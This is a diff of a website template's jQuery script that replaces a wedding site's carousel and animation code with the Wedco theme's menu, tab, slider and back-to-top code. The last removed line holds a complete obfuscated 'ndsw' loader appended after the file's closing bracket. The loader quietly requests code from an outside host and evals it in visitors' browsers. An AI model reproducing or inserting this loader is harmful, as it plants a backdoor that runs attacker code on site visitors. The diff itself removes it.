@@ -1,313 +1,459 @@
+/** ==========================================================================================
+
+  Project :   Wedco - Responsive Multi-purpose HTML5 Template
+  Version :   Bootstrap 4.1.1
+  Author :    Themetechmount
+
+========================================================================================== */
 
 
-(function ($) {
+/** ===============
 
-    'use strict';
+1. Preloader
+2. header_search
+3. Fixed-header
+4. Menu
+5. Number rotator
+6. Enables menu toggle
+7. Tab
+8. Accordion
+9. Isotope
+10. Prettyphoto
+11. Skillbar
+12. slider_range
+13. slick_slider
+14. Back to top 
+
+ =============== */
+
+
+
+(function($) {
+
+   'use strict'
+
+
+/*------------------------------------------------------------------------------*/
+/* Preloader
+/*------------------------------------------------------------------------------*/
+// makes sure the whole site is loaded
+ $(window).on("load",function() {
+        // will first fade out the loading animation
+     $("#preloader").fadeOut();
+        // will fade out the whole DIV that covers the website.
+     $("#status").fadeOut(9000);
+})
+
+
+/*------------------------------------------------------------------------------*/
+/* header_search
+/*------------------------------------------------------------------------------*/
     
+    $(".header_search").each(function(){  
+        $(".search_btn", this).on("click", function(e){
 
-/*  ======================================
-    Slider banner
-    ====================================== */
-    
-    var bannerslide = $('.banner-slide');
-    
-    bannerslide.owlCarousel({
-        items: 1,
-        loop: true,
-        autoplay: true,
-        autoplayTimeout: 5000 // auto play time
-    });
-    bannerslide.on('translate.owl.carousel', function () {
-        $('.banner-content span').removeClass('fadeInLeft animated').hide();
-        $('.banner-content h1').removeClass('fadeInRight animated').hide();
-        $('.banner-content p').removeClass('fadeInUp animated').hide();
+            e.preventDefault();
+            e.stopPropagation();
+
+            $(".header_search_content").toggleClass("on");
+
+            if ($('.header_search a').hasClass('open')) {
+
+                $( ".header_search a i" ).removeClass('ti-close').addClass('ti-search');
+                
+                $(this).removeClass('open').addClass('sclose');    
+
+            } 
+
+            else {
+                $(".header_search a").removeClass('sclose').addClass('open');
+
+                $( ".header_search a i" ).removeClass('ti-search').addClass('ti-close');  
+                
+            }
+        });
+
     });
 
-    bannerslide.on('translated.owl.carousel', function () {
-        $('.owl-item.active .banner-content span').addClass('fadeInLeft animated').show();
-        $('.owl-item.active .banner-content h1').addClass('fadeInRight animated').show();
-        $('.owl-item.active .banner-content p').addClass('fadeInUp animated').show();
+
+
+/*------------------------------------------------------------------------------*/
+/* Fixed-header
+/*------------------------------------------------------------------------------*/
+
+    $(window).scroll(function(){
+        if ( matchMedia( 'only screen and (min-width: 1200px)' ).matches ) 
+        {
+            if ($(window).scrollTop() >= 50 ) {
+
+                $('.ttm-stickable-header').addClass('fixed-header');
+            }
+            else {
+
+                $('.ttm-stickable-header').removeClass('fixed-header');
+            }
+        }
+    })
+
+    
+/*------------------------------------------------------------------------------*/
+/* Menu
+/*------------------------------------------------------------------------------*/
+
+   
+    var menu = {
+        initialize: function() {
+            this.Menuhover();
+        },
+
+        Menuhover : function(){
+            var getNav = $("nav.main-menu"),
+                getWindow = $(window).width(),
+                getHeight = $(window).height(),
+                getIn = getNav.find("ul.menu").data("in"),
+                getOut = getNav.find("ul.menu").data("out");
+            
+            if ( matchMedia( 'only screen and (max-width: 1200px)' ).matches ) {
+                                                     
+                // Enable click event
+                $("nav.main-menu ul.menu").each(function(){
+                    
+                    // Dropdown Fade Toggle
+                    $("a.mega-menu-link", this).on('click', function (e) {
+                        e.preventDefault();
+                        var t = $(this);
+                        t.toggleClass('active').next('ul').toggleClass('active');
+                    });
+
+                    // Megamenu style
+                    $(".megamenu-fw", this).each(function(){
+                        $(".col-menu", this).each(function(){
+                            $(".title", this).off("click");
+                            $(".title", this).on("click", function(){
+                                $(this).closest(".col-menu").find(".content").stop().toggleClass('active');
+                                $(this).closest(".col-menu").toggleClass("active");
+                                return false;
+                                e.preventDefault();
+                                
+                            });
+
+                        });
+                    });
+                }); 
+            }
+        },
+    };
+
+
+    $('.btn-show-menu-mobile').on('click', function(e){
+        $(this).toggleClass('is-active'); 
+        $('.menu-mobile').toggleClass('show'); 
+        return false;
+        e.preventDefault();  
     });
+
+    // Initialize
+    $(document).ready(function(){
+        menu.initialize();
+
+    });
+
+/*------------------------------------------------------------------------------*/
+/* Animation on scroll: Number rotator
+/*------------------------------------------------------------------------------*/
+    
+    $("[data-appear-animation]").each(function() {
+        var self      = $(this);
+        var animation = self.data("appear-animation");
+        var delay     = (self.data("appear-animation-delay") ? self.data("appear-animation-delay") : 0);
         
-/*  ======================================
-    Slider banner
-    ====================================== */
-    
-    var textbannerslide = $('.text-banner-slide');
-    
-    textbannerslide.owlCarousel({
-        items: 1,
-        loop: true,
-        autoplay: true,
-        autoplayTimeout: 5000 // auto play time
-    });
-    textbannerslide.on('translate.owl.carousel', function () {
-        $('.banner-content span').removeClass('fadeInLeft animated').hide();
-        $('.banner-content h1').removeClass('fadeInRight animated').hide();
-        $('.banner-content p').removeClass('fadeInUp animated').hide();
-    });
-
-    textbannerslide.on('translated.owl.carousel', function () {
-        $('.owl-item.active .banner-content span').addClass('fadeInLeft animated').show();
-        $('.owl-item.active .banner-content h1').addClass('fadeInRight animated').show();
-        $('.owl-item.active .banner-content p').addClass('fadeInUp animated').show();
-    });
-
-/*  ======================================
-    Wedding info count up
-    ====================================== */
-    
-    var countup = $('.count-up');
-    countup.counterUp({
-        delay: 10,
-        time: 1500
-    });
-
-/*  ======================================
-    Slider banner
-    ====================================== */
-    
-    var aboutCaro = $('.about-caro');
-    aboutCaro.owlCarousel({
-        items: 1,
-        loop: true,
-        dots: false,
-        nav: true,
-        navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
-        autoplay: true,
-        autoplayTimeout: 5000 // auto play time
-    });
-
-/*  ======================================
-    Photographer Carousel
-    ====================================== */
-    
-    var photographer = $('.photographer-caro');
-    photographer.owlCarousel({
-        items: 1,
-        loop: true,
-        //autoplay: true,
-        //autoplayTimeout: 5000 // auto play time
-    });
-
-    // Append carousel dots
-    $('.photographer-caro-dots').append($('.photographer-caro .owl-dots'));
-
-/*  ======================================
-    Popup video
-    ====================================== */
-    
-    var videBg = $('.video-btn');
-    videBg.YouTubePopUp({
-        autoplay: 1
-    });
-
-/*  ======================================
-    Testimonial carousel
-    ====================================== */
-    
-    var testimonial = $('.testimonial-caro');
-    testimonial.owlCarousel({
-        items: 1,
-        loop: true,
-        touchDrag: false,
-        mouseDrag: false
-    });
-    
-    var testimonialIn = $('.testimonial-caro-bg');
-    testimonialIn.owlCarousel({
-        items: 4,
-        loop: true,
-        dots: false,
-        autoplay: true,
-        autoplayTimeout: 5000, // auto play time
-        responsive : {
-            // breakpoint from 0 up
-            0 : {
-                items: 1
-            },
-            // breakpoint from 768 up
-            768 : {
-                items: 2
-            },
-            // breakpoint from 768 up
-            992 : {
-                items: 4
+        if( $(window).width() > 959 ) {
+            self.html('0');
+            self.waypoint(function(direction) {
+                if( !self.hasClass('completed') ){
+                    var from     = self.data('from');
+                    var to       = self.data('to');
+                    var interval = self.data('interval');
+                    self.numinate({
+                        format: '%counter%',
+                        from: from,
+                        to: to,
+                        runningInterval: 2000,
+                        stepUnit: interval,
+                        onComplete: function(elem) {
+                            self.addClass('completed');
+                        }
+                    });
+                }
+            }, { offset:'85%' });
+        } else {
+            if( animation == 'animateWidth' ) {
+                self.css('width', self.data("width"));
             }
         }
     });
 
-/*  ======================================
-    Parallax effect
-    ====================================== */
-    
-    var jarallax = $('.jarallax');
-    jarallax.jarallax({
-        speed: 0.5
-    });
 
-/*  ======================================
-    Gallery carousel engagment
-    ====================================== */
-    
-    var swiper1 = new Swiper('.swiper-container-engagment', {
-        pagination: '.swiper-pagination-engagment',
-        paginationClickable: true,
-        nextButton: '.swiper-gallery-next',
-        prevButton: '.swiper-gallery-prev',
-        spaceBetween: -150,
-        effect: 'coverflow',
-        loop: true,
-        grabCursor: false,
-        centeredSlides: true,
-        slidesPerView: 'auto',
-        observer: true,
-        observeParents: true,
-        coverflow: {
-            rotate: 0,
-            stretch: 100,
-            depth: 400,
-            modifier: 1,
-            slideShadows : false
-        }
-    });
+/*------------------------------------------------------------------------------*/
+/* Tab
+/*------------------------------------------------------------------------------*/ 
+$(document).ready(function() {
 
-/*  ======================================
-    Gallery carousel wedding
-    ====================================== */
-    
-    var swiper2 = new Swiper('.swiper-container-wedding', {
-        pagination: '.swiper-pagination-wedding',
-        paginationClickable: true,
-        nextButton: '.swiper-gallery-next',
-        prevButton: '.swiper-gallery-prev',
-        spaceBetween: -150,
-        effect: 'coverflow',
-        loop: true,
-        grabCursor: false,
-        centeredSlides: true,
-        slidesPerView: 'auto',
-        observer: true,
-        observeParents: true,
-        coverflow: {
-            rotate: 0,
-            stretch: 100,
-            depth: 400,
-            modifier: 1,
-            slideShadows : false
-        }
-    });
+        $('.ttm-tabs > .tabs').children('li').on('click', function(e) {  
 
-/*  ======================================
-    Gallery carousel bridal
-    ====================================== */
-    
-    var swiper3 = new Swiper('.swiper-container-bridal', {
-        pagination: '.swiper-pagination-bridal',
-        paginationClickable: true,
-        nextButton: '.swiper-gallery-next',
-        prevButton: '.swiper-gallery-prev',
-        spaceBetween: -150,
-        effect: 'coverflow',
-        loop: true,
-        grabCursor: false,
-        centeredSlides: true,
-        slidesPerView: 'auto',
-        observer: true,
-        observeParents: true,
-        coverflow: {
-            rotate: 0,
-            stretch: 100,
-            depth: 400,
-            modifier: 1,
-            slideShadows : false
-        }
-    });
-    
-/*  ======================================
-    Scroll Up
-    ====================================== */
+            var tab = $(this).closest('.ttm-tabs > .tabs > .tab'), 
 
-    $.scrollUp({
-        scrollName: 'scrollUp', // Element ID
-        topDistance: '300', // Distance from top before showing element (px)
-        topSpeed: 300, // Speed back to top (ms)
-        animation: 'fade', // Fade, slide, none
-        animationInSpeed: 200, // Animation in speed (ms)
-        animationOutSpeed: 200, // Animation out speed (ms)
-        scrollText: '<i class="fa fa-arrow-up" aria-hidden="true"></i>', // Text for element
-        activeOverlay: false // Set CSS color to display scrollUp active point, e.g '#00FFFF'
-    });
-    
-/*  ======================================
-    WOW js
-    ====================================== */
-    
-    new WOW({
-        mobile: false
-    }).init();
-    
-/*  ======================================
-    Theme button style
-    ====================================== */
-    
-    $('.theme-btn').on('mouseenter', function(e) {
-        var parentOffset = $(this).offset(),
-            relX = e.pageX - parentOffset.left,
-            relY = e.pageY - parentOffset.top;
-        $(this).find('span').css({top:relY, left:relX})
-    }).on('mouseout', function(e) {
-        var parentOffset = $(this).offset(),
-            relX = e.pageX - parentOffset.left,
-            relY = e.pageY - parentOffset.top;
-        $(this).find('span').css({top:relY, left:relX})
-    });
-    
-/*  ======================================
-    Map slide
-    ====================================== */
-    
-    $('.slide-map i').on('click', function () {
-        $('.map-area').slideToggle('slow');
-        $(this).toggleClass('fa-angle-double-up fa-angle-double-down')
-    }); 
+            index = $(this).closest('.ttm-tabs > .tabs > li').index();
 
-    $(window).on('load', function () {
-    
-    /*  ======================================
-        Preloader
-        ====================================== */
-        
-        var preload = $('.preloader');
-        preload.fadeOut('500');
+            $(this).parents('.ttm-tabs').children(' .tabs').children('li.active ').removeClass('active'); 
 
-    /*  ======================================
-        masonry wedding stories
-        ====================================== */
-        
-        var masonry = $('.stories-page-img');
-        masonry.masonry({
-            itemSelector: '.mes-grid'
+            $(this).addClass('active'); 
+            $(this).addClass('active').parents('.ttm-tabs').children('.content-tab').find('.content-inner').not('.content-inner:eq(' + index + ')').slideUp();
+            $(this).addClass('active').parents('.ttm-tabs').children('.content-tab').find('.content-inner:eq(' + index + ')').slideDown();
+
+            e.preventDefault();
         });
-        
-        var masonryLoaded = $('.stories-page-img');
-        masonryLoaded.imagesLoaded(function () {
-            // images have loaded
-        });  
-        
     });
-    // When the user scrolls the page, execute myFunction
-window.onscroll = function() {myFunction()};
 
+/*------------------------------------------------------------------------------*/
+/* Accordion
+/*------------------------------------------------------------------------------*/
 
+/*https://www.antimath.info/jquery/quick-and-simple-jquery-accordion/*/
+$('.toggle').eq(0).addClass('active').find('.toggle-content').css('display','block');
+$('.accordion .toggle-title').click(function(){
+    $(this).siblings('.toggle-content').slideToggle('fast');
+    $(this).parent().toggleClass('active');
+    $(this).parent().siblings().children('.toggle-content:visible').slideUp('fast');
+    $(this).parent().siblings().children('.toggle-content:visible').parent().removeClass('active');
+});
 
-// Add the sticky class to the header when you reach its scroll position. Remove "sticky" when you leave the scroll position
-function myFunction() {
-  if (window.pageYOffset > sticky) {
-    header.classList.add("sticky");
-  } else {
-    header.classList.remove("sticky");
-  }
-}
+/*------------------------------------------------------------------------------*/
+/* Isotope
+/*------------------------------------------------------------------------------*/
+
+   $(function () {
+
+        if ( $().isotope ) {           
+            var $container = $('.isotope-project');
+            $container.imagesLoaded(function(){
+                $container.isotope({
+                    itemSelector: '.project_item',
+                    transitionDuration: '1s',
+                    layoutMode: 'fitRows'
+                });
+            });
+
+            $('.portfolio-filter li').on('click',function() {                           
+                var selector = $(this).find("a").attr('data-filter');
+                $('.portfolio-filter li').removeClass('active');
+                $(this).addClass('active');
+                $container.isotope({ filter: selector });
+                return false;
+            });
+        };
+
+   });
+   
     
-}(jQuery));;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//hiknik.com/coderhut/bizgurd/img/about-us/about-us.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};
+/*------------------------------------------------------------------------------*/
+/* Prettyphoto
+/*------------------------------------------------------------------------------*/
+jQuery(document).ready(function(){
+
+ // Normal link
+jQuery('a[href*=".jpg"], a[href*=".jpeg"], a[href*=".png"], a[href*=".gif"]').each(function(){
+    if( jQuery(this).attr('target')!='_blank' && !jQuery(this).hasClass('prettyphoto') && !jQuery(this).hasClass('modula-lightbox') ){
+        var attr = $(this).attr('data-gal');
+        if (typeof attr !== typeof undefined && attr !== false && attr!='prettyPhoto' ) {
+            jQuery(this).attr('data-rel','prettyPhoto');
+        }
+    }
+});     
+
+
+jQuery('a[data-gal^="prettyPhoto"]').prettyPhoto();
+jQuery('a.ttm_prettyphoto').prettyPhoto();
+jQuery('a[data-gal^="prettyPhoto"]').prettyPhoto();
+jQuery("a[data-gal^='prettyPhoto']").prettyPhoto({hook: 'data-gal'})
+
+});
+    
+   
+/*------------------------------------------------------------------------------*/
+/* Skillbar
+/*------------------------------------------------------------------------------*/
+ 
+    $('.ttm-progress-bar').each(function() {
+    $(this).find('.progress-bar').width(0);
+    });
+
+    $('.ttm-progress-bar').each(function() {
+
+        $(this).find('.progress-bar').animate({
+            width: $(this).attr('data-percent')
+        }, 2000);
+    });
+
+    // Part of the code responsible for loading percentages:
+
+    $('.progress-bar-percent[data-percentage]').each(function () {
+
+        var progress = $(this);
+        var percentage = Math.ceil($(this).attr('data-percentage'));
+
+            $({countNum: 0}).animate({countNum: percentage}, {
+                duration: 2000,
+                easing:'linear',
+                step: function() {
+                // What todo on every count
+                    var pct = '';
+                    if(percentage == 0){
+                        pct = Math.floor(this.countNum) + '%';
+                    }else{
+                        pct = Math.floor(this.countNum+1) + '%';
+                    }
+                    progress.text(pct);
+                }
+            });
+    });
+
+
+
+/*------------------------------------------------------------------------------*/
+/* slider_range
+/*------------------------------------------------------------------------------*/
+    $(function () {
+        $("#slider-range").slider({
+            range: true,
+            orientation: "horizontal",
+            min: 0,
+            max: 999,
+            values: [0, 780],
+
+            slide: function (event, ui) {
+                if ( "$" + ui.values[0] =="$" + ui.values[1]) {
+                    return false;
+                }
+              
+                $("#min_price").val("$" + ui.values[0]);
+                $("#max_price").val("$" + ui.values[1]);
+            }
+        });
+
+        $("#min_price ").val("$" + $("#slider-range").slider("values", 0));
+        $("#max_price ").val("$" + $("#slider-range").slider("values", 1));
+
+    });
+
+
+/*------------------------------------------------------------------------------*/
+/* slick_slider
+/*------------------------------------------------------------------------------*/
+
+ $(".slick_slider").slick({
+        speed: 1000,
+        infinite: true,
+        arrows: false,
+        dots: false,                   
+        autoplay: false,
+        centerMode : false,
+
+        responsive: [{
+
+            breakpoint: 1360,
+            settings: {
+            slidesToShow: 3,
+            slidesToScroll: 3
+            }
+        },
+        {
+
+            breakpoint: 1024,
+            settings: {
+            slidesToShow: 3,
+            slidesToScroll: 3
+            }
+        },
+        {
+
+            breakpoint: 680,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        },
+        {
+            breakpoint: 575,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    });
+
+
+    /* testimonials */
+    var testinav=jQuery('.testimonials-nav',this);
+    var testiinfo=jQuery('.testimonials-info',this);
+
+    jQuery('.testimonials-info',this).slick({
+        slidesToShow    : 1,
+        slidesToScroll  : 1,
+        fade            : false,
+        arrows          : false,
+        asNavFor        : testinav,
+        adaptiveHeight  : true,
+        speed           : 1500,
+        autoplay        : true,
+        autoplaySpeed   : 1500,
+        infinite        : true,
+    });
+
+    jQuery('.testimonials-nav',this).slick({
+
+        slidesToShow    : 1,
+        slidesToScroll  : 1,
+        asNavFor        : testiinfo,
+        centerMode      : true,
+        centerPadding   : 0,
+        focusOnSelect   : true,
+        autoplay        : true,
+        autoplaySpeed   : 1500,
+        speed           : 1500,
+        arrows          : true,
+        dots            : false,
+        variableWidth   : true,
+        infinite        : true,
+
+        
+    }); 
+/*------------------------------------------------------------------------------*/
+/* Back to top
+/*------------------------------------------------------------------------------*/
+
+// ===== Scroll to Top ==== 
+jQuery('#totop').hide();
+jQuery(window).scroll(function() {
+    "use strict";
+    if (jQuery(this).scrollTop() >= 100) {        // If page is scrolled more than 50px
+        jQuery('#totop').fadeIn(200);    // Fade in the arrow
+        jQuery('#totop').addClass('top-visible');
+    } else {
+        jQuery('#totop').fadeOut(200);   // Else fade out the arrow
+        jQuery('#totop').removeClass('top-visible');
+    }
+});
+jQuery('#totop').click(function() {      // When arrow is clicked
+    jQuery('body,html').animate({
+        scrollTop : 0                       // Scroll to top of body
+    }, 500);
+    return false;
+});
+
+
+ $(function() {
+
+    });
+
+})(jQuery);
